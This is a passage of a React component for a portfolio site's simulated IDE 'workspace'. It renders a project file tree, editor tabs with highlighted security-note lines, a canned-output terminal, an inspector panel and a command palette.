      const list = prev[activeId] ?? [];
      return list.includes(name) ? prev : { ...prev, [activeId]: [...list, name] };
    });
    setActiveTab((prev) => ({ ...prev, [activeId]: name }));
  };

  const closeTab = (name: string) => {
    setOpenTabs((prev) => {
      const list = (prev[activeId] ?? []).filter((n) => n !== name);
      return { ...prev, [activeId]: list };
    });
    if (currentTab === name) {
      const list = (openTabs[activeId] ?? []).filter((n) => n !== name);
      if (list.length) setActiveTab((p) => ({ ...p, [activeId]: list[list.length - 1] }));
    }
  };

  const runProject = async () => {
    setRunning(true);
    const header = [
      "",
      `~/projects/${activeProject.id} ${activeProject.runCommand}`,
    ];
    setTerminalLines((p) => [...p, ...header]);
    for (const line of activeProject.runOutput) {
      await new Promise((r) => setTimeout(r, 220));
      setTerminalLines((p) => [...p, line]);
      requestAnimationFrame(() => {
        terminalRef.current?.scrollTo({ top: terminalRef.current.scrollHeight });
      });
    }
    setTerminalLines((p) => [...p, ""]);
    setRunning(false);
  };

  const stopRun = () => setRunning(false);

  const toggleFolder = (key: string) => {
    setExpanded((prev) => {
      const next = new Set(prev);
      next.has(key) ? next.delete(key) : next.add(key);
      return next;
    });
  };

  /* group projects by domain for sidebar */
  const grouped = useMemo(() => {
    const byDomain: Record<string, Project[]> = {};
    PROJECTS.forEach((p) => {
      (byDomain[p.domain] ??= []).push(p);
    });
    return byDomain;
  }, []);

  /* command palette filter */
  const paletteResults = useMemo(() => {
    const q = paletteQuery.toLowerCase().trim();
    if (!q) return PROJECTS.slice(0, 8);
    return PROJECTS.filter(
      (p) =>
        p.name.toLowerCase().includes(q) ||
        p.tags.some((t) => t.includes(q)) ||
        p.domain.includes(q)
    ).slice(0, 8);
  }, [paletteQuery]);

  const lines = currentFile.content.split("\n");
  const vulnSet = new Set(activeProject.vulnLines ?? []);

  return (
    <div className="mx-auto max-w-7xl px-4 py-12 sm:px-6">
      <Reveal>
        <div className="max-w-3xl">
          <div className="inline-flex items-center gap-2 font-mono text-xs uppercase tracking-[0.25em] text-cyber-cyan">
            <span className="h-px w-8 bg-gradient-to-r from-cyber-cyan to-transparent" />
            workspace::open
          </div>
          <h1 className="mt-3 font-display text-3xl font-bold leading-tight sm:text-4xl">
            Live engineering <span className="text-gradient-cyber">workspace</span>
          </h1>
          <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
            Real repos, real files, real terminal. Click a project, browse its files, hit
            <kbd className="mx-1 rounded border border-border bg-muted px-1.5 py-0.5 font-mono text-[10px]">Run</kbd>
            to simulate execution, or
            <kbd className="mx-1 rounded border border-border bg-muted px-1.5 py-0.5 font-mono text-[10px]">⌘P</kbd>
            to jump.
          </p>
        </div>
      </Reveal>

      {/* ═════ MOBILE PROJECT SELECTOR ═════ */}
      <div className="mt-6 lg:hidden">
        <button
          onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
          className="flex w-full items-center justify-between rounded-xl border border-glass-border bg-black/40 px-4 py-3"
        >
          <div className="flex items-center gap-3">
            <Menu className="h-4 w-4 text-cyber-cyan" />
            <span className="font-mono text-sm text-foreground">{activeProject.name}</span>
            <span className={cn("h-2 w-2 rounded-full", STATUS_COLOR[activeProject.status])} />
          </div>
          <ChevronDown className={cn("h-4 w-4 text-muted-foreground transition-transform", mobileMenuOpen && "rotate-180")} />
        </button>

        <AnimatePresence>
          {mobileMenuOpen && (
            <motion.div
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: "auto", opacity: 1 }}
              exit={{ height: 0, opacity: 0 }}
              transition={{ duration: 0.2 }}
              className="overflow-hidden"
            >
              <div className="mt-2 max-h-80 overflow-y-auto rounded-xl border border-glass-border bg-black/60 p-2">
                {PROJECTS.map((p) => {
                  const Icon = DOMAIN_ICON[p.domain];
                  return (
                    <button
                      key={p.id}
                      onClick={() => openProject(p.id)}
                      className={cn(
                        "flex w-full items-center gap-3 rounded-lg px-3 py-2.5 text-left transition-colors",
                        p.id === activeId
                          ? "bg-cyber-cyan/10 text-foreground"
                          : "text-foreground/80 hover:bg-muted/30"
                      )}
                    >
                      <Icon className="h-4 w-4 text-cyber-cyan" />
                      <span className="flex-1 text-sm font-medium">{p.name}</span>
                      <span className={cn("h-1.5 w-1.5 rounded-full", STATUS_COLOR[p.status])} />
                    </button>
                  );
                })}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* IDE shell */}
      <div
        className="mt-4 overflow-hidden rounded-2xl ring-1 ring-glass-border lg:mt-8"
        style={{ background: "oklch(0.10 0.02 265 / 0.92)" }}
      >
        {/* title bar */}
        <div className="flex items-center justify-between gap-3 border-b border-glass-border/60 bg-black/40 px-3 py-2">
          <div className="flex items-center gap-1.5">
            <span className="h-2.5 w-2.5 rounded-full bg-rose-500/70" />
            <span className="h-2.5 w-2.5 rounded-full bg-amber-400/70" />
            <span className="h-2.5 w-2.5 rounded-full bg-emerald-400/70" />
            <span className="ml-3 font-mono text-[11px] text-muted-foreground">
              mostafa-galal · workspace — {activeProject.name}
            </span>
          </div>
          <div className="hidden items-center gap-2 sm:flex">
            <button
              onClick={() => setShowPalette(true)}
              className="inline-flex items-center gap-2 rounded-md border border-border bg-black/30 px-2.5 py-1 font-mono text-[10px] text-muted-foreground hover:text-foreground"
            >
              <Search className="h-3 w-3" />
              jump to project
              <kbd className="ml-2 rounded border border-border px-1 text-[9px]">⌘P</kbd>
            </button>
          </div>
        </div>

        <div className="grid h-[520px] grid-cols-1 lg:h-[600px] lg:grid-cols-[220px_1fr_240px]">
          {/* file tree — desktop only */}
          <aside className="hidden overflow-y-auto border-r border-glass-border/60 bg-black/30 p-2 lg:block">
            <div className="px-2 pb-2 font-mono text-[10px] uppercase tracking-[0.25em] text-cyber-cyan">
              explorer
            </div>
            {Object.entries(grouped).map(([domain, items]) => {
              const Icon = DOMAIN_ICON[domain as keyof typeof DOMAIN_ICON];
              const isOpen = expanded.has(domain);
              return (
                <div key={domain} className="mb-1">
                  <button
                    onClick={() => toggleFolder(domain)}
                    className="flex w-full items-center gap-1 rounded px-1.5 py-1 text-left hover:bg-muted/30"
                  >
                    <ChevronRight
                      className={cn("h-3 w-3 text-muted-foreground transition-transform", isOpen && "rotate-90")}
                    />
                    {isOpen ? <FolderOpen className="h-3.5 w-3.5 text-amber-400/80" /> : <Folder className="h-3.5 w-3.5 text-amber-400/60" />}
                    <span className="font-mono text-[11px] uppercase tracking-wider text-foreground/90">{domain}/</span>
                    <Icon className="ml-auto h-3 w-3 text-muted-foreground" />
                  </button>
                  {isOpen && (
                    <ul className="ml-4 mt-0.5 space-y-0.5">
                      {items.map((p) => {
                        const isActive = p.id === activeId;
                        const isOpened = expanded.has(`p:${p.id}`);
                        return (
                          <li key={p.id}>
                            <div className="flex items-center">
                              <button
                                onClick={() => toggleFolder(`p:${p.id}`)}
                                className="grid h-5 w-5 place-items-center text-muted-foreground hover:text-foreground"
                              >
                                <ChevronRight className={cn("h-3 w-3 transition-transform", isOpened && "rotate-90")} />
                              </button>
                              <button
                                onClick={() => openProject(p.id)}
                                className={cn(
                                  "flex flex-1 items-center gap-1.5 rounded px-1.5 py-1 text-left",
                                  isActive ? "bg-cyber-cyan/10 text-foreground" : "text-foreground/85 hover:bg-muted/30"
                                )}
                              >
                                {p.status === "private" ? (
                                  <Lock className="h-3 w-3 text-cyber-violet" />
                                ) : (
                                  <Folder className="h-3 w-3 text-amber-400/70" />
                                )}
                                <span className="truncate font-mono text-[11px]">{p.id}</span>
                                <span className={cn("ml-auto h-1.5 w-1.5 rounded-full", STATUS_COLOR[p.status])} />
                              </button>
                            </div>
                            {isOpened && (
                              <ul className="ml-7 mt-0.5 space-y-0.5">
                                {p.files.map((f) => {
                                  const FIcon = FILE_ICON(f.lang);
                                  const fileActive = isActive && currentTab === f.name;
                                  return (
                                    <li key={f.name}>
                                      <button
                                        onClick={() => {
                                          openProject(p.id);
                                          openFile(f.name);
                                        }}
                                        className={cn(
                                          "flex w-full items-center gap-1.5 rounded px-1.5 py-0.5 text-left",
                                          fileActive ? "text-cyber-cyan" : "text-muted-foreground hover:text-foreground"
                                        )}
                                      >
                                        <FIcon className="h-3 w-3" />
                                        <span className="truncate font-mono text-[11px]">{f.name}</span>
                                      </button>
                                    </li>
                                  );
                                })}
                              </ul>
                            )}
                          </li>
                        );
                      })}
                    </ul>
                  )}
                </div>
              );
            })}
          </aside>

          {/* center: editor + terminal */}
          <main className="flex min-w-0 flex-col">
            {/* tabs */}
            <div className="flex items-center gap-1 overflow-x-auto border-b border-glass-border/60 bg-black/40 px-2 py-1">
              <AnimatePresence>
                {tabs.map((name) => {
                  const f = activeProject.files.find((x) => x.name === name)!;
                  const FIcon = FILE_ICON(f.lang);
                  const isActiveTab = name === currentTab;
                  return (
                    <motion.div
                      key={name}
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -4 }}
                      transition={{ duration: 0.15 }}
                      className={cn(
                        "group inline-flex shrink-0 items-center gap-1.5 rounded-t-md border-x border-t px-2.5 py-1 font-mono text-[11px]",
                        isActiveTab
                          ? "border-glass-border bg-black/60 text-foreground"
                          : "border-transparent text-muted-foreground hover:text-foreground"
                      )}
                    >
                      <button onClick={() => setActiveTab((p) => ({ ...p, [activeId]: name }))} className="inline-flex items-center gap-1.5">
                        <FIcon className={cn("h-3 w-3", isActiveTab && "text-cyber-cyan")} />
                        <span className="max-w-[100px] truncate sm:max-w-[140px]">{name}</span>
                      </button>
                      {tabs.length > 1 && (
                        <button
                          onClick={() => closeTab(name)}
                          className="opacity-0 transition-opacity group-hover:opacity-100 hover:text-rose-400"
                        >
                          <X className="h-3 w-3" />
                        </button>
                      )}
                    </motion.div>
                  );
                })}
              </AnimatePresence>

              <div className="ml-auto flex items-center gap-1 pr-1">
                <button
                  onClick={running ? stopRun : runProject}
                  disabled={running}
                  className={cn(
                    "inline-flex items-center gap-1.5 rounded-md px-2.5 py-1 font-mono text-[10px] uppercase tracking-wider transition-all",
                    running
                      ? "bg-rose-500/15 text-rose-400 ring-1 ring-rose-500/40"
                      : "bg-emerald-500/15 text-emerald-400 ring-1 ring-emerald-500/40 hover:bg-emerald-500/25"
                  )}
                >
                  {running ? <Stop className="h-3 w-3" /> : <Play className="h-3 w-3" />}
                  {running ? "running" : "run"}
                </button>
              </div>
            </div>

            {/* editor */}
            <div className="flex-1 overflow-auto bg-black/50 font-mono text-[12px] leading-[1.55]">
              <pre className="m-0 flex">
                <code className="select-none border-r border-glass-border/40 px-3 py-3 text-right text-muted-foreground/50">
                  {lines.map((_, i) => (
                    <div key={i}>{i + 1}</div>
                  ))}
                </code>
                <code className="block flex-1 px-4 py-3 text-foreground/95">
                  {lines.map((line, i) => {
                    const lineNo = i + 1;
                    const isVuln = vulnSet.has(lineNo) && (currentFile.lang === "py" || currentFile.lang === "c");
                    return (
                      <div
                        key={i}
                        className={cn(
                          "relative",
                          isVuln && "bg-rose-500/[0.08] before:absolute before:left-0 before:top-0 before:h-full before:w-0.5 before:bg-rose-500"
                        )}
                      >
                        {highlight(line || " ", currentFile.lang)}
                        {isVuln && (
                          <span className="ml-3 rounded bg-rose-500/15 px-1.5 py-0.5 font-mono text-[9px] uppercase tracking-wider text-rose-400">
                            ! sec-note
                          </span>
                        )}
                      </div>
                    );
                  })}
                </code>
              </pre>
            </div>

            {/* terminal */}
            <div className="border-t border-glass-border/60 bg-black/70">
              <div className="flex items-center justify-between border-b border-glass-border/40 px-3 py-1.5">
                <div className="inline-flex items-center gap-1.5 font-mono text-[10px] uppercase tracking-[0.2em] text-cyber-cyan">
                  <TerminalSquare className="h-3 w-3" />
                  terminal · /bin/bash
                </div>
                <button
                  onClick={() => setTerminalLines(["cleared.", ""])}
                  className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground hover:text-foreground"
                >
                  clear
                </button>
              </div>
              <div ref={terminalRef} className="h-36 overflow-y-auto px-3 py-2 font-mono text-[11px] leading-relaxed lg:h-44">
                {terminalLines.map((l, i) => (
                  <div
                    key={i}
                    className={cn(
                      l.startsWith("[+]") && "text-emerald-400",
                      l.startsWith("[!]") && "text-rose-400",
                      l.startsWith("[*]") && "text-cyber-cyan",
                      l.startsWith("$") || l.startsWith("~/") ? "text-foreground" : "",
                      !l.match(/^[\[\$~]/) && "text-muted-foreground"
                    )}
                  >
                    {l}
                  </div>
                ))}
                {running && (
                  <div className="text-cyber-cyan">
                    <span className="inline-block h-2 w-2 animate-pulse rounded-sm bg-cyber-cyan" />
                  </div>
                )}
              </div>
            </div>

            {/* status bar */}
            <div className="flex items-center justify-between gap-3 border-t border-glass-border/60 bg-cyber-cyan/[0.05] px-3 py-1 font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
              <div className="flex items-center gap-3">
                <span className="text-cyber-cyan">● {activeProject.status}</span>
                <span>{activeProject.domain}</span>
                <span>{currentFile.lang}</span>
                <span>{lines.length} lines</span>
              </div>
              <div className="hidden items-center gap-3 sm:flex">
                <span>UTF-8</span>
                <span>LF</span>
                <span>spaces: 2</span>
              </div>
            </div>
          </main>

          {/* inspector — desktop only */}
          <aside className="hidden overflow-y-auto border-l border-glass-border/60 bg-black/30 p-4 lg:block">
            <div className="font-mono text-[10px] uppercase tracking-[0.25em] text-cyber-cyan">
              inspector
            </div>
            <h3 className="mt-3 font-display text-base font-semibold leading-tight">
              {activeProject.name}
            </h3>
            <div className="mt-1 flex items-center gap-2 font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
              <span className={cn("h-1.5 w-1.5 rounded-full", STATUS_COLOR[activeProject.status])} />
              {activeProject.status}
              <span>·</span>
              {activeProject.domain}
            </div>
            <p className="mt-3 text-xs text-muted-foreground">{activeProject.description}</p>

            {activeProject.image && (
              <div className="mt-3 overflow-hidden rounded-md ring-1 ring-glass-border">
                <img src={activeProject.image} alt={activeProject.name} className="h-24 w-full object-cover" loading="lazy" />
              </div>
            )}

            <div className="mt-4">
              <div className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
                <Tag className="mr-1 inline h-3 w-3" />tags
              </div>
              <div className="mt-2 flex flex-wrap gap-1">
                {activeProject.tags.map((t) => (
                  <span key={t} className="rounded border border-cyber-cyan/30 bg-cyber-cyan/5 px-1.5 py-0.5 font-mono text-[9px] text-cyber-cyan">
                    #{t}
                  </span>
                ))}
              </div>
            </div>

            <div className="mt-4">
              <div className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
                files
              </div>
              <div className="mt-2 font-mono text-[10px] text-muted-foreground">
                {activeProject.files.length} files · {activeProject.files.reduce((s, f) => s + f.content.split("\n").length, 0)} LOC
              </div>
            </div>

            <div className="mt-4 space-y-2">
              {activeProject.github && (
                <a
                  href={activeProject.github}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex w-full items-center justify-center gap-1.5 rounded-md border border-border bg-black/40 px-2 py-1.5 font-mono text-[10px] uppercase tracking-wider text-foreground hover:border-cyber-cyan/40 hover:text-cyber-cyan"
                >
                  <Github className="h-3 w-3" />
                  source
                </a>
              )}
              {activeProject.demo && (
                <a
                  href={activeProject.demo}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex w-full items-center justify-center gap-1.5 rounded-md border border-border bg-black/40 px-2 py-1.5 font-mono text-[10px] uppercase tracking-wider text-foreground hover:border-cyber-cyan/40 hover:text-cyber-cyan"
                >
                  <ExternalLink className="h-3 w-3" />
                  demo
                </a>
              )}
              {activeProject.status === "private" && (
                <div className="rounded-md border border-cyber-violet/30 bg-cyber-violet/5 p-2 font-mono text-[10px] uppercase tracking-wider text-cyber-violet">
                  <Lock className="mr-1 inline h-3 w-3" />
                  classified · contact required
                </div>
              )}
            </div>
          </aside>
        </div>
      </div>

      {/* command palette */}
      <AnimatePresence>
        {showPalette && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 grid place-items-start bg-background/80 p-4 pt-32 backdrop-blur-sm"
            onClick={() => setShowPalette(false)}
          >
            <motion.div
              initial={{ y: -10, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              exit={{ y: -10, opacity: 0 }}
              transition={{ duration: 0.15 }}
              onClick={(e) => e.stopPropagation()}
              className="mx-auto w-full max-w-xl overflow-hidden rounded-xl ring-1 ring-glass-border"
              style={{ background: "oklch(0.12 0.02 265 / 0.95)" }}
            >
              <div className="flex items-center gap-2 border-b border-glass-border/60 px-3 py-2">
                <Search className="h-4 w-4 text-muted-foreground" />
                <input
                  autoFocus
                  value={paletteQuery}
                  onChange={(e) => setPaletteQuery(e.target.value)}
                  placeholder="Jump to project, tag, or domain..."
                  className="w-full bg-transparent font-mono text-sm outline-none placeholder:text-muted-foreground/60"
                />
                <kbd className="rounded border border-border px-1.5 py-0.5 font-mono text-[9px] text-muted-foreground">esc</kbd>
              </div>
              <ul className="max-h-80 overflow-y-auto p-1">
                {paletteResults.map((p) => {
                  const Icon = DOMAIN_ICON[p.domain];
                  return (
                    <li key={p.id}>
                      <button
                        onClick={() => {
                          openProject(p.id);
                          setShowPalette(false);
                          setPaletteQuery("");
                        }}
                        className="flex w-full items-center gap-3 rounded-md px-3 py-2 text-left hover:bg-muted/30"
                      >
                        <Icon className="h-4 w-4 text-cyber-cyan" />
                        <span className="font-display text-sm">{p.name}</span>
                        <span className="ml-auto font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
                          {p.domain}
                        </span>
                      </button>
                    </li>
                  );
                })}
                {paletteResults.length === 0 && (
                  <li className="px-3 py-4 text-center text-sm text-muted-foreground">
                    No matches.
                  </li>
                )}
              </ul>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
